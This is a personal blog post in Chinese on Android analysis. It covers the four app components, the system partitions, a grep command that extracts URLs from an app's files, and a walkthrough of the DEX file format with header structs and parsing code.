

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="hexi">
  <meta name="keywords" content="">
  
    <meta name="description" content="四大组件1234broadcast receivercontent providerserviceactivity  是一个会话窗口可以看成一个屏幕，弹出的界面  url寻找（通过正则匹配） 12grep -ohr -E &quot;https?:&#x2F;&#x2F;[a-zA-Z0-9\.\&#x2F;_&amp;&#x3D;@$%?~#-]*&quot; &#x2F;Kevin&#x2F;com.sogou.map.android.maps&#x2F; |s">
<meta property="og:type" content="article">
<meta property="og:title" content="Android分析">
<meta property="og:url" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="hexi的个人博客">
<meta property="og:description" content="四大组件1234broadcast receivercontent providerserviceactivity  是一个会话窗口可以看成一个屏幕，弹出的界面  url寻找（通过正则匹配） 12grep -ohr -E &quot;https?:&#x2F;&#x2F;[a-zA-Z0-9\.\&#x2F;_&amp;&#x3D;@$%?~#-]*&quot; &#x2F;Kevin&#x2F;com.sogou.map.android.maps&#x2F; |s">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240303184252009.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/informatin/book/%E7%AC%94%E8%AE%B0/v2-b515dccfea97aaa4eb5636702c94bafe_1440w.webp">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240412175652802.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240411205836609.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240411205858080.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240410183242166-17127451645171.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240410213347069.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240303181212519.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/informatin/book/%E7%AC%94%E8%AE%B0/image-20240303204739917.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240329213832780.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240521211538793.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240521211655478.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240521212753303.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240724202627427.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240724202817696.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240725034556041.png">
<meta property="og:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240725034618178.png">
<meta property="article:published_time" content="2025-03-22T11:43:11.000Z">
<meta property="article:modified_time" content="2025-03-22T11:52:37.154Z">
<meta property="article:author" content="hexi">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2025/03/22/android%E5%88%86%E6%9E%90/image-20240303184252009.png">
  
  
  
  <title>Android分析 - hexi的个人博客</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Android分析"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-03-22 19:43" pubdate>
          2025年3月22日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          14k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          119 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Android分析</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">broadcast receiver<br><span class="hljs-attribute">content</span> provider<br>service<br>activity  是一个会话窗口可以看成一个屏幕，弹出的界面<br></code></pre></td></tr></table></figure>

<p>url寻找（通过正则匹配）</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">grep <span class="hljs-operator">-</span>ohr <span class="hljs-operator">-</span>E <span class="hljs-string">&quot;https?://[a-zA-Z0-9<span class="hljs-char escape_">\.</span><span class="hljs-char escape_">\/</span>_&amp;=@$%?~#-]*&quot;</span> <span class="hljs-operator">/</span>Kevin<span class="hljs-operator">/</span>com.sogou.<span class="hljs-built_in">map</span>.android.maps<span class="hljs-symbol">/</span> |sort|uniq <span class="hljs-operator">&gt;</span><span class="hljs-operator">&gt;</span> test.txt<br><br></code></pre></td></tr></table></figure>

<p>内核：</p>
<p>android系统的分区</p>
<ul>
<li>&#x2F;boot分区：该分区主要包含android kernel镜像和ramdisk（一种将RAM模拟为硬盘的技术，提高访问速度）。</li>
<li>&#x2F;system分区：该分区主要存放Android框架及其相关配置，包含系统预装的app。</li>
<li>&#x2F;recovery分区：该分区主要是备份的分区</li>
<li>&#x2F;data 用户数据的存储区域</li>
</ul>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell">/<span class="hljs-class"><span class="hljs-keyword">data</span>/app/com.xxxx/以包名存放应用安装文件，包括base.apk/lib</span><br>/<span class="hljs-class"><span class="hljs-keyword">data</span>/<span class="hljs-keyword">data</span>/com.xxxx/存放应用数据，包括sp、db等</span><br>/<span class="hljs-class"><span class="hljs-keyword">data</span>/dalvik-cache 以包名存放优化过的应用dex文件</span><br></code></pre></td></tr></table></figure>

<ul>
<li>&#x2F;cache分区：Android系统缓存区域，保存系统最常访问的数据和应用程序。</li>
<li>&#x2F;misc分区：此分区包含一些系统功能设置开关和数据，比如usb设置</li>
<li>sdcard分区：外置存储分区</li>
<li>&#x2F;vendor分区：厂商定制的分区，厂商的某些系统升级可以通过这个分区来实现</li>
</ul>
<h5 id="DEX-文件格式解析"><a href="#DEX-文件格式解析" class="headerlink" title="DEX 文件格式解析"></a>DEX 文件格式解析</h5><p>在 Android 中，不管是 Dalvik 还是 Art，和 JVM 的区别还是很大的。Android 系统并不直接使用 Class 文件，而是将所有的 Class 文件聚合打包成 <strong>DEX</strong> 文件，DEX 文件相比单个单个的 Class 文件更加紧凑，可以直接在 Android Runtime 下执行</p>
<p><strong>DEX 文件的生成</strong></p>
<p><img src="image-20240303184252009.png" srcset="/img/loading.gif" lazyload alt="image-20240303184252009"></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada">header : <span class="hljs-type">DEX</span> 文件头，记录了一些当前文件的信息以及其他数据结构在文件中的偏移量<br>string_ids : 字符串的偏移量<br>type_ids : 类型信息的偏移量<br>proto_ids : 方法声明的偏移量<br>field_ids : 字段信息的偏移量<br>method_ids : 方法信息（所在类，方法声明以及方法名）的偏移量<br>class_def : 类信息的偏移量<br>data : ： 数据区<br>link_data : 静态链接数据区<br></code></pre></td></tr></table></figure>



<p><strong>header</strong></p>
<p>DEX 文件头部分的具体格式可以参考 DexFile.h 中的定义：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">struct DexHeader &#123;<br>    u1  magic[<span class="hljs-number">8</span>];           <span class="hljs-comment">// 魔数</span><br>    u4  checksum;           <span class="hljs-comment">// adler 校验值</span><br>    u1  signature[kSHA1DigestLen]; <span class="hljs-comment">// sha1 校验值</span><br>    u4  fileSize;           <span class="hljs-comment">// DEX 文件大小</span><br>    u4  headerSize;         <span class="hljs-comment">// DEX 文件头大小</span><br>    u4  endianTag;          <span class="hljs-comment">// 字节序</span><br>    u4  linkSize;           <span class="hljs-comment">// 链接段大小</span><br>    u4  linkOff;            <span class="hljs-comment">// 链接段的偏移量</span><br>    u4  mapOff;             <span class="hljs-comment">// DexMapList 偏移量</span><br>    u4  <span class="hljs-built_in">string</span>IdsSize;      <span class="hljs-comment">// DexStringId 个数</span><br>    u4  <span class="hljs-built_in">string</span>IdsOff;       <span class="hljs-comment">// DexStringId 偏移量</span><br>    u4  typeIdsSize;        <span class="hljs-comment">// DexTypeId 个数</span><br>    u4  typeIdsOff;         <span class="hljs-comment">// DexTypeId 偏移量</span><br>    u4  protoIdsSize;       <span class="hljs-comment">// DexProtoId 个数</span><br>    u4  protoIdsOff;        <span class="hljs-comment">// DexProtoId 偏移量</span><br>    u4  fieldIdsSize;       <span class="hljs-comment">// DexFieldId 个数</span><br>    u4  fieldIdsOff;        <span class="hljs-comment">// DexFieldId 偏移量</span><br>    u4  methodIdsSize;      <span class="hljs-comment">// DexMethodId 个数</span><br>    u4  methodIdsOff;       <span class="hljs-comment">// DexMethodId 偏移量</span><br>    u4  classDefsSize;      <span class="hljs-comment">// DexCLassDef 个数</span><br>    u4  classDefsOff;       <span class="hljs-comment">// DexClassDef 偏移量</span><br>    u4  dataSize;           <span class="hljs-comment">// 数据段大小</span><br>    u4  dataOff;            <span class="hljs-comment">// 数据段偏移量</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>其中的 <code>u</code> 表示无符号数，<code>u1</code> 就是 8 位无符号数，<code>u4</code> 就是 32 位无符号数。</p>
<p><code>magic</code> 一般是常量，用来标记 DEX 文件，它可以分解为：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">文件标识 dex <span class="hljs-punctuation">+</span> 换行符 <span class="hljs-punctuation">+</span> DEX 版本 <span class="hljs-punctuation">+</span> <span class="hljs-number">0</span>  <span class="hljs-comment">//字符串格式为 dex\n035\0，十六进制为 0x6465780A30333500。</span><br></code></pre></td></tr></table></figure>

<p><strong>checksum</strong> 是对去除 <code>magic</code> 、 <code>checksum</code> 以外的文件部分作 alder32 算法得到的校验值，用于判断 DEX 文件是否被篡改。</p>
<p><strong>signature</strong> 是对除去 <code>magic</code> 、 <code>checksum</code> 、 <code>signature</code> 以外的文件部分作 sha1 得到的文件哈希值。</p>
<p><strong>endianTag</strong> 用于标记 DEX 文件是大端表示还是小端表示。由于 DEX 文件是运行在 Android 系统中的，所以一般都是小端表示，这个值也是恒定值 <code>0x12345678</code>。</p>
<p><strong>string_ids</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">struct DexStringId &#123;<br>    u4 stringDataOff;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>string_ids</code> 是一个偏移量数组，<code>stringDataOff</code> 表示每个字符串在 data 区的偏移量。根据偏移量在 data 区拿到的数据中，第一个字节表示的是字符串长度，后面跟着的才是字符串数据。这块逻辑比较简单，直接看一下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">private <span class="hljs-keyword">void</span> <span class="hljs-title function_">parseDexString</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nparse DexString&quot;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        int stringIdsSize = dex.<span class="hljs-title function_">getDexHeader</span>().<span class="hljs-property">string_ids__size</span>;<br>        <span class="hljs-comment">//尝试获取dex对象的DexHeader属性中的string_ids_size字段。string_ids_size字段通常表示DEX文件中字符串标识符段的大小。在DEX文件格式中，字符串标识符用于以字符串形式存储类名、方法名、字段名等。</span><br>        <span class="hljs-comment">//dex对象具有getDexHeader()方法，该方法返回包含string_ids_size字段的对象。</span><br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; stringIdsSize; i++) &#123;<br>            int string_data_off = reader.<span class="hljs-title function_">readInt</span>();<br>            byte size = dexData[string_data_off]; <span class="hljs-comment">// 第一个字节表示该字符串的长度，之后是字符串内容</span><br>            <span class="hljs-title class_">String</span> string_data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-title class_">Utils</span>.<span class="hljs-title function_">copy</span>(dexData, string_data_off + <span class="hljs-number">1</span>, size));<br>            <span class="hljs-title class_">DexString</span> string = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexString</span>(string_data_off, string_data);<br>            dexStrings.<span class="hljs-title function_">add</span>(string);<br>            <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;string[%d] data: %s&quot;</span>, i, string.<span class="hljs-property">string_data</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;<br>        e.<span class="hljs-title function_">printStackTrace</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>type_ids</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">struct DexTypeId &#123;<br>    u4  descriptorIdx;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>type_ids</code> 表示的是类型信息，<code>descriptorIdx</code> 指向 <code>string_ids</code> 中元素。根据索引直接在上一步读取到的字符串池即可解析对应的类型信息，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">private <span class="hljs-keyword">void</span> <span class="hljs-title function_">parseDexType</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nparse DexTypeId&quot;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        int typeIdsSize = dex.<span class="hljs-title function_">getDexHeader</span>().<span class="hljs-property">type_ids__size</span>;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; typeIdsSize; i++) &#123;<br>            int descriptor_idx = reader.<span class="hljs-title function_">readInt</span>();<br>            <span class="hljs-title class_">DexTypeId</span> dexTypeId = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexTypeId</span>(descriptor_idx, dexStringIds.<span class="hljs-title function_">get</span>(descriptor_idx).<span class="hljs-property">string_data</span>);<br>            dexTypeIds.<span class="hljs-title function_">add</span>(dexTypeId);<br>            <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;type[%d] data: %s&quot;</span>, i, dexTypeId.<span class="hljs-property">string_data</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;<br>        e.<span class="hljs-title function_">printStackTrace</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>proto_ids</strong></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">DexProtoId</span> &#123;<br>    u4  shortyIdx;          <span class="hljs-comment">/* index into stringIds for shorty descriptor */</span><br>    u4  returnTypeIdx;      <span class="hljs-comment">/* index into typeIds list for return type */</span><br>    u4  parametersOff;      <span class="hljs-comment">/* file offset to type_list for parameter types */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>proto_ids</code> 表示方法声明信息，它包含以下三个变量：</p>
<ul>
<li>shortyIdx : 指向 string_ids ，表示方法声明的字符串</li>
<li>returnTypeIdx : 指向 type_ids ，表示方法的返回类型</li>
<li>parametersOff ： 方法参数列表的偏移量</li>
</ul>
<p>方法参数列表的数据结构在 DexFile.h 中用 <code>DexTypeList</code> 来表示：</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">DexTypeList</span> &#123;<br>    u4  size;               <span class="hljs-comment">/* #of entries in list */</span><br>    DexTypeItem list[<span class="hljs-number">1</span>];    <span class="hljs-comment">/* entries */</span><br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-type">DexTypeItem</span> &#123;<br>    u2  typeIdx;            <span class="hljs-comment">/* index into typeIds */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>size</code> 表示方法参数的个数，参数用 <code>DexTypeItem</code> 表示，它只有一个属性 <code>typeIdx</code>，指向 <code>type_ids</code> 中对应项。具体的解析代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript">private <span class="hljs-keyword">void</span> <span class="hljs-title function_">parseDexProto</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\nparse DexProto&quot;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        int protoIdsSize = dex.<span class="hljs-title function_">getDexHeader</span>().<span class="hljs-property">proto_ids__size</span>;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; protoIdsSize; i++) &#123;<br>            int shorty_idx = reader.<span class="hljs-title function_">readInt</span>();<br>            int return_type_idx = reader.<span class="hljs-title function_">readInt</span>();<br>            int parameters_off = reader.<span class="hljs-title function_">readInt</span>();<br><br>            <span class="hljs-title class_">DexProtoId</span> dexProtoId = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexProtoId</span>(shorty_idx, return_type_idx, parameters_off);<br>            <span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;proto[%d]: %s %s %d&quot;</span>, i, dexStringIds.<span class="hljs-title function_">get</span>(shorty_idx).<span class="hljs-property">string_data</span>,<br>                    dexTypeIds.<span class="hljs-title function_">get</span>(return_type_idx).<span class="hljs-property">string_data</span>, parameters_off);<br><br>            <span class="hljs-keyword">if</span> (parameters_off &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-title function_">parseDexProtoParameters</span>(parameters_off);<br>            &#125;<br><br>            dexProtos.<span class="hljs-title function_">add</span>(dexProtoId);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;<br>        e.<span class="hljs-title function_">printStackTrace</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><strong>field_ids</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexFieldId &#123;<br>    u2  classIdx;           /* index into typeIds list for defining class */<br>    u2  typeIdx;            /* index into typeIds for field type */<br>    u4  nameIdx;            /* index into stringIds for field name */<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>field_ids</code> 表示的是字段信息，指明了字段所在的类，字段的类型以及字段名称，在 <code>DexFile.h</code> 中定义为 <code>DexFieldId</code> , 其各个字段含义如下：</p>
<ul>
<li>classIdx : 指向 type_ids ，表示字段所在类的信息</li>
<li>typeIdx : 指向 ype_ids ，表示字段的类型信息</li>
<li>nameIdx : 指向 string_ids ，表示字段名称</li>
</ul>
<p>解析结果</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">parse DexField<br>field[0]: LHello;-&gt;HELLO_WORLD;Ljava/lang/String;<br>field[1]: Ljava/lang/System;-&gt;out;Ljava/io/PrintStream;<br></code></pre></td></tr></table></figure>



<p><strong>method_ids</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexMethodId &#123;<br>    u2  classIdx;           /* index into typeIds list for defining class */<br>    u2  protoIdx;           /* index into protoIds for method prototype */<br>    u4  nameIdx;            /* index into stringIds for method name */<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>method_ids</code> 指明了方法所在的类、方法声明以及方法名。在 DexFile.h 中用 <code>DexMethodId</code> 表示该项，其属性含义如下：</p>
<ul>
<li>classIdx : 指向 type_ids ，表示类的类型</li>
<li>protoIdx : 指向 type_ids ，表示方法声明</li>
<li>nameIdx : 指向 string_ids ，表示方法名</li>
</ul>
<p><strong>class_def</strong></p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs applescript">struct DexClassDef &#123;<br>    u4  classIdx;           /* index <span class="hljs-keyword">into</span> typeIds <span class="hljs-keyword">for</span> this <span class="hljs-built_in">class</span> */<br>    u4  accessFlags;<br>    u4  superclassIdx;      /* index <span class="hljs-keyword">into</span> typeIds <span class="hljs-keyword">for</span> superclass */<br>    u4  interfacesOff;      /* <span class="hljs-built_in">file</span> <span class="hljs-built_in">offset</span> <span class="hljs-keyword">to</span> DexTypeList */<br>    u4  sourceFileIdx;      /* index <span class="hljs-keyword">into</span> stringIds <span class="hljs-keyword">for</span> source <span class="hljs-built_in">file</span> <span class="hljs-built_in">name</span> */<br>    u4  annotationsOff;     /* <span class="hljs-built_in">file</span> <span class="hljs-built_in">offset</span> <span class="hljs-keyword">to</span> annotations_directory_item */<br>    u4  classDataOff;       /* <span class="hljs-built_in">file</span> <span class="hljs-built_in">offset</span> <span class="hljs-keyword">to</span> class_data_item */<br>    u4  staticValuesOff;    /* <span class="hljs-built_in">file</span> <span class="hljs-built_in">offset</span> <span class="hljs-keyword">to</span> DexEncodedArray */<br>&#125;;<br></code></pre></td></tr></table></figure>

